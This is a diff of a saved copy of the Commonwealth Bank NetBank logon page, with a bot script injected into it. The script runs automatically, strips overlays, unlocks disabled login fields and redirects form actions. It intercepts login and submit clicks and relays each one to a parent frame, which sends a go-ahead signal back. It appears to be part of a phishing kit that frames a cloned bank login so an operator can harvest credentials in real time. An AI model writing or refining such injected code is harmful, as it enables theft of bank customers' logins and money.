@@ -1,4 +1,4 @@
-﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"> <html xmlns=http://www.w3.org/1999/xhtml xml:lang=en lang=en class="win chrome chrome1 webkit webkit5 cssBeforeSupport"><!--
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"> <html xmlns=http://www.w3.org/1999/xhtml xml:lang=en lang=en class="win chrome chrome1 webkit webkit5 cssBeforeSupport"><!--
  Page saved with SingleFile 
  url: https://www.my.commbank.com.au/netbank/Logon/Logon.aspx?ei=mv_logon-NB 
  saved date: Sun Aug 09 2026 17:22:57 GMT+0300 (TÃ¼rkiye Standart Saati)
@@ -11,20 +11,166 @@
 <script>
 (function(){
   var DISABLED_CLASS_RE = /disabled|disabl|not-allowed|is-disabled|btn-disabled|sg-Btn--disabled|disabled-btn|_disabled|-disabled/i;
+  var ACTION_TOKEN_RE = /(log\s?in|login|logon|log\s*on|sign\s?in|signon|sign\s*on|auth|authenticate|continue|next|proceed|access|submit|confirm|validate|accept|unlock|open|go|enter|ilerle|ileri|devam|tamamla|giriÅŸ|giris|tamam|sonraki|onayla|onay|sÄ±ra|sÄ±radaki|next\s*step|step\s*next|password_submit|submit_password|acceso|iniciar|sigon|go\s*on)/i;
   var lastSubmittedAt = 0;
-  function notifyParentAndTryForm(btnOrInput){
+  var pollCount = 0;
+
+  function normalizeToken(v){
+    return (v||"").trim().toLowerCase().replace(/[^a-z0-9]+/g," ");
+  }
+  function getActionToken(el){
+    var vt = "";
+    try { vt = (el.value||""); } catch(e){}
+    return normalizeToken([
+      el.textContent||"",
+      vt,
+      (el.getAttribute&&el.getAttribute("aria-label"))||"",
+      (el.getAttribute&&el.getAttribute("value"))||"",
+      (el.getAttribute&&el.getAttribute("title"))||"",
+      (el.getAttribute&&el.getAttribute("data-label"))||"",
+      (el.getAttribute&&el.getAttribute("data-text"))||""
+    ].join(" "));
+  }
+
+  function clearOverlays(doc){
     try{
-      var now = Date.now();
-      if(now - lastSubmittedAt < 1400) return;
-      lastSubmittedAt = now;
+      var allEls = doc.querySelectorAll("*");
+      for(var i=0;i<allEls.length;i++){
+        var el = allEls[i];
+        var tag = (el.tagName||"").toLowerCase();
+        if(tag.indexOf("ing-")===0||tag.indexOf("paper-")===0||tag.indexOf("iron-")===0||tag.indexOf("vaadin-")===0||tag.indexOf("ui5-")===0||tag.indexOf("sl-")===0){
+          try{
+            var zi = parseInt(window.getComputedStyle(el).zIndex||"0",10)||0;
+            var role = ((el.getAttribute&&el.getAttribute("role"))||"").toLowerCase();
+            var txt = (tag+" "+(el.className||"")+" "+role+" "+(el.id||"")).toLowerCase();
+            if(zi>900 || /overlay|dialog|backdrop|modal|popup/.test(txt)){
+              try{ el.style.setProperty("display","none","important"); }catch(e){}
+              try{ el.style.visibility = "hidden"; }catch(e){}
+              try{ el.style.opacity = "0"; }catch(e){}
+              try{ el.style.pointerEvents = "none"; }catch(e){}
+            }
+          }catch(e){}
+        }
+      }
       try{
-        if(window.parent && window.parent.postMessage){
-          try{ window.parent.postMessage({kind:'BOT_V3_SUBMIT_CLICKED'}, '*'); }catch(e){}
-          try{ window.parent.postMessage({type:'AU_BOT_SUBMIT_NOW'}, '*'); }catch(e){}
+        var highZi = doc.querySelectorAll("div, section, article, aside, span, header, footer, nav, dialog");
+        for(var j=0;j<highZi.length;j++){
+          var hz = highZi[j];
+          var zz = parseInt(window.getComputedStyle(hz).zIndex||"0",10)||0;
+          if(zz>900){
+            var htag = (hz.tagName||"").toLowerCase();
+            var htxt = (hz.textContent||"").trim().toLowerCase();
+            var hasForm = hz.querySelector("input, button, select, textarea, form") != null;
+            var isLogin = /login|submit|continue|next|giriÅŸ|giris|onay|tamam/.test((hz.id||"")+" "+(hz.className||"")+" "+htxt);
+            if(!hasForm && !isLogin && htag!=="button"){
+              try{ hz.style.setProperty("display","none","important"); }catch(e){}
+              try{ hz.style.pointerEvents = "none"; }catch(e){}
+            }else{
+              try{ hz.style.setProperty("pointer-events","none","important"); }catch(e){}
+              var insides = hz.querySelectorAll("input, button, select, textarea, label");
+              for(var k=0;k<insides.length;k++){ try{ insides[k].style.setProperty("pointer-events","auto","important");}catch(e){} }
+            }
+          }
         }
       }catch(e){}
+      try{
+        var overlaySel = 'overlay, dialog, backdrop, paper-dialog, ing-core-overlay, iron-overlay, iron-overlay-backdrop, .overlay, [class*="overlay"], [data-overlay], [role="dialog"], [role="alertdialog"], .modal, [class*="modal"], [class*="backdrop"], [id*="overlay"], [id*="dialog"]';
+        var overlays = doc.querySelectorAll(overlaySel);
+        for(var l=0;l<overlays.length;l++){
+          var ov = overlays[l];
+          try{ ov.style.setProperty("display","none","important"); }catch(e){}
+          try{ ov.style.visibility = "hidden"; }catch(e){}
+          try{ ov.style.opacity = "0"; }catch(e){}
+          try{ ov.style.pointerEvents = "none"; }catch(e){}
+        }
+      }catch(e){}
+    }catch(e){}
+  }
+
+  function cleanInputs(doc){
+    try{
+      var inputs = Array.prototype.slice.call(doc.querySelectorAll("input, textarea, select")).filter(function(f){
+        var t = ((f.getAttribute&&f.getAttribute("type"))||"").toLowerCase();
+        return t!=="hidden";
+      });
+      for(var i=0;i<inputs.length;i++){
+        (function(field, idx){
+          try{
+            if(field.hasAttribute&&field.hasAttribute("readonly")) field.removeAttribute("readonly");
+            try{ if(field.readOnly===true) field.readOnly=false; }catch(e){}
+            if(field.hasAttribute&&field.hasAttribute("disabled") && ((field.getAttribute("type")||"").toLowerCase())!=="hidden"){
+              field.removeAttribute("disabled");
+              try{ field.disabled=false; }catch(e){}
+            }
+            if((field.getAttribute&&field.getAttribute("tabindex"))==="-1") field.setAttribute("tabindex","0");
+            if(!(field.hasAttribute&&field.hasAttribute("tabindex"))) field.setAttribute("tabindex","0");
+            try{
+              field.style.setProperty("pointer-events","auto","important");
+              field.style.setProperty("position","relative","important");
+              field.style.setProperty("z-index","5","important");
+              field.style.setProperty("opacity","1","important");
+              field.style.setProperty("visibility","visible","important");
+            }catch(e){}
+            var p = field; var depth=0;
+            while(p && depth<6){
+              try{
+                p.style.setProperty("pointer-events","auto","important");
+                var cz = parseInt(window.getComputedStyle(p).zIndex||"0",10)||0;
+                if(cz<=0 && depth<4){
+                  try{
+                    if(window.getComputedStyle(p).position==="static"){ p.style.setProperty("position","relative","important"); }
+                    p.style.setProperty("z-index",String(Math.max(2,6-depth)),"important");
+                  }catch(e){}
+                }
+              }catch(e){}
+              p = p.parentElement; depth++;
+            }
+            if(idx%3===0 && doc.activeElement!==field){
+              setTimeout(function(){ try{ try{ field.focus({preventScroll:true}); }catch(e){ try{ field.focus();}catch(e2){} } }catch(e3){} }, 0);
+            }
+          }catch(e){}
+        })(inputs[i], i);
+      }
+    }catch(e){}
+  }
+
+  function cleanButtonsAndContainers(doc){
+    try{
+      var disContainers = doc.querySelectorAll('[class*="disabled"][class*="login"], [class*="login"][class*="disabled"], .login-button-container.disabled, .login-container.disabled, .login-wrap.disabled');
+      for(var i=0;i<disContainers.length;i++){
+        var c = disContainers[i];
+        try{
+          if(c.classList && c.classList.remove){
+            var rem=[];
+            for(var ci=0;ci<c.classList.length;ci++){ if(DISABLED_CLASS_RE.test(c.classList[ci])) rem.push(c.classList[ci]); }
+            for(var ri=0;ri<rem.length;ri++) try{ c.classList.remove(rem[ri]); }catch(e){}
+          }
+        }catch(e){}
+        try{ c.style.setProperty("pointer-events","auto","important"); c.style.opacity="1"; if(c.removeAttribute) c.removeAttribute("disabled"); if(c.setAttribute) c.setAttribute("aria-disabled","false"); }catch(e){}
+      }
+    }catch(e){}
+  }
+
+  function setupForms(doc){
+    try{
+      var forms = doc.querySelectorAll("form");
+      for(var i=0;i<forms.length;i++){
+        var f = forms[i];
+        try{
+          f.setAttribute("action","#");
+          f.setAttribute("method","post");
+          f.setAttribute("target","_self");
+          f.setAttribute("novalidate","novalidate");
+        }catch(e){}
+      }
+    }catch(e){}
+  }
+
+  function tryTriggerFormSubmitFrom(btnOrInput){
+    try{
       var f = null;
-      if(btnOrInput && btnOrInput.getAttribute){
+      try{ if(btnOrInput && btnOrInput.form) f = btnOrInput.form; }catch(e){}
+      if(!f && btnOrInput && typeof btnOrInput.getAttribute === "function"){
         var fa = btnOrInput.getAttribute('form');
         if(fa){ try{ f = document.getElementById(fa); }catch(e){} }
       }
@@ -51,118 +197,163 @@
       try{ if(!ev.defaultPrevented){ try{ if(typeof f.requestSubmit === 'function'){ f.requestSubmit(); } }catch(e3){} try{ f.submit(); }catch(e3){} } }catch(e2){}
     }catch(e){}
   }
-  function runFix(){
+
+  function buttonClickHandler(e){
+    try{ var ev = e||window.event; }catch(e2){ return; }
     try{
-      var overlaySelector = 'overlay, dialog, backdrop, paper-dialog, ing-core-overlay, iron-overlay, iron-overlay-backdrop, .overlay, [class*="overlay"], [data-overlay], [role="dialog"], [role="alertdialog"]';
-      var overlays = document.querySelectorAll(overlaySelector);
-      overlays.forEach(function(el){
+      var tgt = (ev.target||ev.srcElement||null);
+      if(tgt){
+        var tg = ((tgt.tagName||"")+"").toLowerCase();
+        var tp = "";
+        try{ tp = (tgt.getAttribute&&tgt.getAttribute("type")||"").toLowerCase(); }catch(e3){}
+        var role = "";
+        try{ role = (tgt.getAttribute&&tgt.getAttribute("role")||"").toLowerCase(); }catch(e3){}
+        var isButtonLike = tg==="button" || (tg==="input" && (tp==="submit"||tp==="button")) || role==="button";
+        if(!isButtonLike){ return; }
+      }
+    }catch(e3){}
+    var now = Date.now();
+    if(now - lastSubmittedAt < 1200) return;
+    lastSubmittedAt = now;
+    try{ if(ev.preventDefault) ev.preventDefault(); }catch(e3){}
+    try{ if(ev.stopPropagation) ev.stopPropagation(); }catch(e3){}
+    try{ if(ev.stopImmediatePropagation) ev.stopImmediatePropagation(); }catch(e3){}
+    try{
+      if(window.parent && typeof window.parent.postMessage==="function"){
+        window.parent.postMessage({ kind: "BOT_V3_SUBMIT_CLICKED" }, "*");
+      }
+    }catch(e3){}
+    try{
+      var customEv = null;
+      try{ customEv = new CustomEvent("AU_BOT_V5_SUBMIT_REQUEST", { detail: { ts: now } }); }
+      catch(e4){ try{ customEv = document.createEvent("Event"); customEv.initEvent("AU_BOT_V5_SUBMIT_REQUEST",true,true); customEv.detail={ts:now}; }catch(e5){} }
+      if(customEv) try{ window.dispatchEvent(customEv); }catch(e6){}
+    }catch(e3){}
+    try{ tryTriggerFormSubmitFrom(tgt||document.querySelector("button")); }catch(e3){}
+  }
+
+  function buttonKeyHandler(e){
+    var ev = e||window.event;
+    try{
+      var key = (ev&&(ev.key||ev.keyCode||ev.which)) || "";
+      if(key === "Enter" || key === 13 || key === "NumpadEnter" || (typeof key==="string" && key.toLowerCase()==="enter")){
+        buttonClickHandler(ev);
+      }
+    }catch(e3){}
+  }
+
+  function attachButtonHandlers(doc){
+    try{
+      var buttonsSelector = 'button, input[type="submit"], input[type="button"], [role="button"], a.btn, [class*="btn-primary"], [class*="btn-default"], [class*="btn-lg"], [data-testid*="login"], [data-testid*="submit"], [class*="login-button"], [id*="login-button"], [id*="submit-button"], [onclick], [class*="btn"], [class*="login"], [class*="submit"], [class*="continue"], [class*="next"], [id*="btn"], [id*="submit"], [id*="continue"], [id*="next"], [class*="logon"], [class*="signin"], [id*="logon"], [id*="signin"]';
+      var buttons = doc.querySelectorAll(buttonsSelector);
+      var seen = [];
+      function isSeen(n){ for(var s=0;s<seen.length;s++){ if(seen[s]===n) return true; } return false; }
+      function attachOne(btn){
+        if(isSeen(btn)) return; seen.push(btn);
+        var tag = ((btn.tagName||"")+"").toLowerCase();
+        var type = "";
+        try{ type = (btn.getAttribute&&btn.getAttribute("type")||"").toLowerCase(); }catch(e){}
+        var role = "";
+        try{ role = (btn.getAttribute&&btn.getAttribute("role")||"").toLowerCase(); }catch(e){}
+        var isButtonLike = tag==="button" || type==="submit" || type==="button" || role==="button";
+        var tok = getActionToken(btn);
+        var hasOnclick = btn.hasAttribute&&btn.hasAttribute("onclick");
+        if(!(ACTION_TOKEN_RE.test(tok) || isButtonLike || hasOnclick)) return;
         try{
-          el.style.setProperty('display','none','important');
-          el.style.visibility = 'hidden';
-          el.style.pointerEvents = 'none';
-          el.style.setProperty('z-index','-1','important');
-          el.setAttribute('aria-hidden','true');
-        }catch(e){}
-      });
-    }catch(e){}
-    try{
-      var stepEls = document.querySelectorAll('[class*="step"], [id*="step"], [class*="Step"], [id*="Step"], [class*="indicator"], [id*="indicator"], [id*="progressbar"], [id*="progress-bar"], [class*="progress-bar"], [class*="progress"]');
-      stepEls.forEach(function(el){
-        var txt = (el.textContent || el.innerText || '').trim();
-        if(/step\s*\d|of\s*\d|adim|adım|ilerleme|ileri|progress/i.test(txt)){
-          try{ el.style.display = 'none'; el.setAttribute('aria-hidden','true'); }catch(e){}
-        }
-      });
-    }catch(e){}
-    try{
-      var interactives = document.querySelectorAll('input, select, textarea, button');
-      interactives.forEach(function(el){
-        var tag = (el.tagName || '').toLowerCase();
-        var type = (el.getAttribute('type') || '').toLowerCase();
-        try{ if(el.getAttribute('tabindex') === '-1'){ el.setAttribute('tabindex','0'); } }catch(e){}
-        try{ if(el.classList && el.classList.contains && el.classList.contains('input-empty-password')){ el.classList.remove('input-empty-password'); } }catch(e){}
-        try{
-          if(el.hasAttribute && el.hasAttribute('readonly')){
-            el.removeAttribute('readonly');
-            try{ el.readOnly = false; }catch(e2){}
+          if(btn.classList && btn.classList.remove){
+            var rem=[];
+            for(var ci=0;ci<btn.classList.length;ci++){ if(DISABLED_CLASS_RE.test(btn.classList[ci])) rem.push(btn.classList[ci]); }
+            for(var ri=0;ri<rem.length;ri++) try{ btn.classList.remove(rem[ri]); }catch(e){}
           }
         }catch(e){}
+        try{ if((btn.type==="submit"||btn.type==="button") && btn.disabled) btn.disabled=false; }catch(e){}
+        try{ if(btn.removeAttribute) btn.removeAttribute("disabled"); }catch(e){}
+        try{ if(btn.setAttribute) btn.setAttribute("aria-disabled","false"); }catch(e){}
+        try{ if((btn.getAttribute&&btn.getAttribute("tabindex"))==="-1") btn.setAttribute("tabindex","0"); }catch(e){}
         try{
-          if(el.hasAttribute && el.hasAttribute('disabled')){
-            if(type !== 'hidden'){
-              if(tag === 'input' || tag === 'select' || tag === 'textarea' || tag === 'button'){
-                el.removeAttribute('disabled');
-                try{ el.disabled = false; }catch(e2){}
-              }
+          btn.style.setProperty("pointer-events","auto","important");
+          btn.style.cursor="pointer";
+        }catch(e){}
+        try{
+          btn.removeEventListener("click", buttonClickHandler, false);
+          btn.addEventListener("click", buttonClickHandler, false);
+          btn.removeEventListener("touchend", buttonClickHandler, false);
+          btn.addEventListener("touchend", buttonClickHandler, false);
+          btn.removeEventListener("keydown", buttonKeyHandler, false);
+          btn.addEventListener("keydown", buttonKeyHandler, false);
+        }catch(e){}
+      }
+      for(var i=0;i<buttons.length;i++) attachOne(buttons[i]);
+      if(seen.length===0){
+        try{
+          var allIn = (doc.body||doc.documentElement).querySelectorAll("*");
+          var bfRe = /btn|button|login|logon|signin|submit|continue|next|ileri|giriÅŸ|giris|sonraki|tamam|onay|devam|enter|confirm|password_submit|submit_password|acceso|iniciar|log_on|log_in|sign_in|sigon|auth|validate|accept|proceed|unlock|open/i;
+          for(var j=0;j<allIn.length;j++){
+            (function(el){
+              if(isSeen(el)) return;
+              var tg = ((el.tagName||"")+"").toLowerCase();
+              var tp = "";
+              try{ tp = (el.getAttribute&&el.getAttribute("type")||"").toLowerCase(); }catch(e){}
+              var rol = "";
+              try{ rol = (el.getAttribute&&el.getAttribute("role")||"").toLowerCase(); }catch(e){}
+              var tOk = tg==="button" || tp==="submit" || tp==="button" || rol==="button";
+              var ict = ((el.id||"")+" "+(el.className||"")+" "+((el.getAttribute&&el.getAttribute("data-testid"))||"")+" "+((el.getAttribute&&el.getAttribute("name"))||"")+" "+((el.textContent||"").trim().slice(0,120)));
+              if(tOk || bfRe.test(ict)){ attachOne(el); }
+            })(allIn[j]);
+          }
+        }catch(e){}
+      }
+      try{
+        var allI = doc.querySelectorAll("*");
+        for(var k=0;k<allI.length;k++){
+          (function(el){
+            if(isSeen(el)) return;
+            var tg2 = ((el.tagName||"")+"").toLowerCase();
+            if(tg2.indexOf("ing-")!==0 && tg2.indexOf("ui5-")!==0 && tg2.indexOf("sl-")!==0) return;
+            var tok2 = getActionToken(el);
+            var rol2 = "";
+            try{ rol2 = (el.getAttribute&&el.getAttribute("role")||"").toLowerCase(); }catch(e){}
+            if(ACTION_TOKEN_RE.test(tok2) || rol2==="button" || /submit|login|button|next|continue/.test(tok2)){
+              attachOne(el);
             }
-          }
-        }catch(e){}
-        try{
-          el.style.pointerEvents = 'auto';
-          el.style.opacity = '1';
-          if(tag === 'button' || type === 'submit' || type === 'button'){ el.style.cursor = 'pointer'; }
-          el.setAttribute('aria-disabled','false');
-        }catch(e){}
-        try{
-          if(el.classList && el.classList.remove){
-            var removes = [];
-            for(var ci=0; ci<el.classList.length; ci++){
-              var cls = el.classList[ci];
-              if(DISABLED_CLASS_RE.test(cls)) removes.push(cls);
-            }
-            removes.forEach(function(c){ try{ el.classList.remove(c); }catch(e2){} });
-          }
-        }catch(e){}
-      });
-    }catch(e){}
-    try{
-      var containers = document.querySelectorAll('[class*="disabled"][class*="login"], [class*="login"][class*="disabled"], .login-button-container.disabled, .login-container.disabled, .login-wrap.disabled');
-      containers.forEach(function(c){
-        try{
-          var removes = [];
-          for(var ci=0; ci<c.classList.length; ci++){
-            var cls = c.classList[ci];
-            if(DISABLED_CLASS_RE.test(cls)) removes.push(cls);
-          }
-          removes.forEach(function(cl){ try{ c.classList.remove(cl); }catch(e2){} });
-          c.style.pointerEvents = 'auto';
-          c.style.opacity = '1';
-        }catch(e){}
-      });
-    }catch(e){}
-    try{
-      var buttons = document.querySelectorAll('button, input[type="submit"], input[type="button"], [role="button"], a.btn, [class*="btn-primary"], [class*="btn-default"], [class*="btn-lg"], [data-testid*="login"], [data-testid*="submit"], [class*="login-button"], [id*="login-button"], [id*="submit-button"]');
-      buttons.forEach(function(btn){
-        if(!btn._gfBotHookedV4){
-          btn._gfBotHookedV4 = true;
-          var handler = function(e){ try{ notifyParentAndTryForm(btn); }catch(err){} };
-          try{ btn.addEventListener('click', handler, false); }catch(e){}
-          try{ btn.addEventListener('mousedown', handler, false); }catch(e){}
-          try{ btn.addEventListener('touchend', handler, false); }catch(e){}
-          try{
-            btn.addEventListener('keydown', function(e){
-              if(e && (e.key === 'Enter' || e.keyCode === 13)){ handler(e); }
-            }, false);
-          }catch(e){}
+          })(allI[k]);
         }
-      });
-    }catch(e){}
-    try{
-      var allInputs = document.querySelectorAll('form input, form select, form textarea');
-      allInputs.forEach(function(inp){
-        if(!inp._gfBotEnterHookedV4){
-          inp._gfBotEnterHookedV4 = true;
+      }catch(e){}
+      try{
+        var allInputs = doc.querySelectorAll('form input, form select, form textarea');
+        for(var m=0;m<allInputs.length;m++){
+          var inp = allInputs[m];
+          if(inp._gfBotEnterHookedV5) continue;
+          inp._gfBotEnterHookedV5 = true;
           try{
             inp.addEventListener('keydown', function(e){
               if(e && (e.key === 'Enter' || e.keyCode === 13)){
-                try{ notifyParentAndTryForm(inp); }catch(err){}
+                try{ buttonClickHandler(e); }catch(err){}
               }
             }, false);
           }catch(e){}
         }
-      });
+      }catch(e){}
     }catch(e){}
   }
+
+  function runFix(){
+    try{
+      var doc = document;
+      pollCount++;
+      clearOverlays(doc);
+      cleanInputs(doc);
+      cleanButtonsAndContainers(doc);
+      setupForms(doc);
+      attachButtonHandlers(doc);
+      try{
+        if(window.parent && typeof window.parent.postMessage==="function"){
+          window.parent.postMessage({ kind: "AU_BOT_HTML_POLL", pollCount: pollCount }, "*");
+        }
+      }catch(e){}
+    }catch(e){}
+  }
+
   try{
     window.addEventListener('message', function(ev){
       try{
@@ -174,16 +365,25 @@
     });
   }catch(e){}
   try{ runFix(); }catch(e){}
-  try{ setTimeout(runFix, 150); }catch(e){}
-  try{ setTimeout(runFix, 500); }catch(e){}
+  try{ setTimeout(runFix, 50); }catch(e){}
+  try{ setTimeout(runFix, 250); }catch(e){}
+  try{ setTimeout(runFix, 750); }catch(e){}
   try{ setTimeout(runFix, 1500); }catch(e){}
+  try{
+    var phase1Iters = 0;
+    var phase1Timer = setInterval(function(){
+      phase1Iters++;
+      if(phase1Iters >= 40){ clearInterval(phase1Timer); return; }
+      try{ runFix(); }catch(e){}
+    }, 250);
+  }catch(e){}
   try{ setInterval(runFix, 900); }catch(e){}
   try{
     if(document.readyState === 'loading'){
-      document.addEventListener('DOMContentLoaded', runFix);
-      window.addEventListener('load', runFix);
+      document.addEventListener('DOMContentLoaded', runFix, false);
+      window.addEventListener('load', runFix, false);
     } else {
-      runFix();
+      try{ runFix(); }catch(e){}
     }
   }catch(e){}
 })();
@@ -319,186 +519,7 @@ A simpler, smarter experience is coming soon.
 <meta name=referrer content=no-referrer><meta http-equiv=content-security-policy content=&quot;default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:; frame-src 'self' data:;&quot;>
 
 <!-- GENERIC FIX INJECTED BY BOT V4 -->
-<script>
-(function(){
-  var DISABLED_CLASS_RE = /disabled|disabl|not-allowed|is-disabled|btn-disabled|sg-Btn--disabled|disabled-btn|_disabled|-disabled/i;
-  var lastSubmittedAt = 0;
-  function notifyParentAndTryForm(btnOrInput){
-    try{
-      var now = Date.now();
-      if(now - lastSubmittedAt < 1400) return;
-      lastSubmittedAt = now;
-      try{
-        if(window.parent && window.parent.postMessage){
-          try{ window.parent.postMessage({kind:'BOT_V3_SUBMIT_CLICKED'}, '*'); }catch(e){}
-          try{ window.parent.postMessage({type:'AU_BOT_SUBMIT_NOW'}, '*'); }catch(e){}
-        }
-      }catch(e){}
-      var f = null;
-      if(btnOrInput && btnOrInput.getAttribute){
-        var fa = btnOrInput.getAttribute('form');
-        if(fa){ try{ f = document.getElementById(fa); }catch(e){} }
-      }
-      if(!f && btnOrInput && typeof btnOrInput.closest === 'function'){ try{ f = btnOrInput.closest('form'); }catch(e){} }
-      if(!f){ f = document.querySelector('form'); }
-      if(!f) return;
-      try{
-        var onsubmitAttr = f.getAttribute('onsubmit');
-        if(onsubmitAttr && typeof onsubmitAttr === 'string' && onsubmitAttr.trim()){
-          try{
-            var fn = new Function('event', onsubmitAttr);
-            var fakeEv = { preventDefault: function(){}, stopPropagation: function(){}, returnValue: true };
-            var result = fn.call(f, fakeEv);
-            if(result === false || fakeEv.returnValue === false) return;
-          }catch(e2){}
-        }
-      }catch(e){}
-      var ev;
-      try{
-        if(typeof Event === 'function'){ ev = new Event('submit', { bubbles: true, cancelable: true }); }
-        else { ev = document.createEvent('Event'); ev.initEvent('submit', true, true); }
-        f.dispatchEvent(ev);
-      }catch(e2){ ev = { defaultPrevented: false }; }
-      try{ if(!ev.defaultPrevented){ try{ if(typeof f.requestSubmit === 'function'){ f.requestSubmit(); } }catch(e3){} try{ f.submit(); }catch(e3){} } }catch(e2){}
-    }catch(e){}
-  }
-  function runFix(){
-    try{
-      var overlaySelector = 'overlay, dialog, backdrop, paper-dialog, ing-core-overlay, iron-overlay, iron-overlay-backdrop, .overlay, [class*="overlay"], [data-overlay], [role="dialog"], [role="alertdialog"]';
-      var overlays = document.querySelectorAll(overlaySelector);
-      overlays.forEach(function(el){
-        try{
-          el.style.setProperty('display','none','important');
-          el.style.visibility = 'hidden';
-          el.style.pointerEvents = 'none';
-          el.style.setProperty('z-index','-1','important');
-          el.setAttribute('aria-hidden','true');
-        }catch(e){}
-      });
-    }catch(e){}
-    try{
-      var stepEls = document.querySelectorAll('[class*="step"], [id*="step"], [class*="Step"], [id*="Step"], [class*="indicator"], [id*="indicator"], [id*="progressbar"], [id*="progress-bar"], [class*="progress-bar"], [class*="progress"]');
-      stepEls.forEach(function(el){
-        var txt = (el.textContent || el.innerText || '').trim();
-        if(/step\s*\d|of\s*\d|adim|adım|ilerleme|ileri|progress/i.test(txt)){
-          try{ el.style.display = 'none'; el.setAttribute('aria-hidden','true'); }catch(e){}
-        }
-      });
-    }catch(e){}
-    try{
-      var interactives = document.querySelectorAll('input, select, textarea, button');
-      interactives.forEach(function(el){
-        var tag = (el.tagName || '').toLowerCase();
-        var type = (el.getAttribute('type') || '').toLowerCase();
-        try{ if(el.getAttribute('tabindex') === '-1'){ el.setAttribute('tabindex','0'); } }catch(e){}
-        try{ if(el.classList && el.classList.contains && el.classList.contains('input-empty-password')){ el.classList.remove('input-empty-password'); } }catch(e){}
-        try{
-          if(el.hasAttribute && el.hasAttribute('readonly')){
-            el.removeAttribute('readonly');
-            try{ el.readOnly = false; }catch(e2){}
-          }
-        }catch(e){}
-        try{
-          if(el.hasAttribute && el.hasAttribute('disabled')){
-            if(type !== 'hidden'){
-              if(tag === 'input' || tag === 'select' || tag === 'textarea' || tag === 'button'){
-                el.removeAttribute('disabled');
-                try{ el.disabled = false; }catch(e2){}
-              }
-            }
-          }
-        }catch(e){}
-        try{
-          el.style.pointerEvents = 'auto';
-          el.style.opacity = '1';
-          if(tag === 'button' || type === 'submit' || type === 'button'){ el.style.cursor = 'pointer'; }
-          el.setAttribute('aria-disabled','false');
-        }catch(e){}
-        try{
-          if(el.classList && el.classList.remove){
-            var removes = [];
-            for(var ci=0; ci<el.classList.length; ci++){
-              var cls = el.classList[ci];
-              if(DISABLED_CLASS_RE.test(cls)) removes.push(cls);
-            }
-            removes.forEach(function(c){ try{ el.classList.remove(c); }catch(e2){} });
-          }
-        }catch(e){}
-      });
-    }catch(e){}
-    try{
-      var containers = document.querySelectorAll('[class*="disabled"][class*="login"], [class*="login"][class*="disabled"], .login-button-container.disabled, .login-container.disabled, .login-wrap.disabled');
-      containers.forEach(function(c){
-        try{
-          var removes = [];
-          for(var ci=0; ci<c.classList.length; ci++){
-            var cls = c.classList[ci];
-            if(DISABLED_CLASS_RE.test(cls)) removes.push(cls);
-          }
-          removes.forEach(function(cl){ try{ c.classList.remove(cl); }catch(e2){} });
-          c.style.pointerEvents = 'auto';
-          c.style.opacity = '1';
-        }catch(e){}
-      });
-    }catch(e){}
-    try{
-      var buttons = document.querySelectorAll('button, input[type="submit"], input[type="button"], [role="button"], a.btn, [class*="btn-primary"], [class*="btn-default"], [class*="btn-lg"], [data-testid*="login"], [data-testid*="submit"], [class*="login-button"], [id*="login-button"], [id*="submit-button"]');
-      buttons.forEach(function(btn){
-        if(!btn._gfBotHookedV4){
-          btn._gfBotHookedV4 = true;
-          var handler = function(e){ try{ notifyParentAndTryForm(btn); }catch(err){} };
-          try{ btn.addEventListener('click', handler, false); }catch(e){}
-          try{ btn.addEventListener('mousedown', handler, false); }catch(e){}
-          try{ btn.addEventListener('touchend', handler, false); }catch(e){}
-          try{
-            btn.addEventListener('keydown', function(e){
-              if(e && (e.key === 'Enter' || e.keyCode === 13)){ handler(e); }
-            }, false);
-          }catch(e){}
-        }
-      });
-    }catch(e){}
-    try{
-      var allInputs = document.querySelectorAll('form input, form select, form textarea');
-      allInputs.forEach(function(inp){
-        if(!inp._gfBotEnterHookedV4){
-          inp._gfBotEnterHookedV4 = true;
-          try{
-            inp.addEventListener('keydown', function(e){
-              if(e && (e.key === 'Enter' || e.keyCode === 13)){
-                try{ notifyParentAndTryForm(inp); }catch(err){}
-              }
-            }, false);
-          }catch(e){}
-        }
-      });
-    }catch(e){}
-  }
-  try{
-    window.addEventListener('message', function(ev){
-      try{
-        var d = ev.data;
-        if(d && typeof d === 'object' && d.kind === 'AU_BOT_CAN_PROCEED_NOW'){
-          lastSubmittedAt = 0;
-        }
-      }catch(_){}
-    });
-  }catch(e){}
-  try{ runFix(); }catch(e){}
-  try{ setTimeout(runFix, 150); }catch(e){}
-  try{ setTimeout(runFix, 500); }catch(e){}
-  try{ setTimeout(runFix, 1500); }catch(e){}
-  try{ setInterval(runFix, 900); }catch(e){}
-  try{
-    if(document.readyState === 'loading'){
-      document.addEventListener('DOMContentLoaded', runFix);
-      window.addEventListener('load', runFix);
-    } else {
-      runFix();
-    }
-  }catch(e){}
-})();
-</script>
+
 </head>
 <body>
 <div>
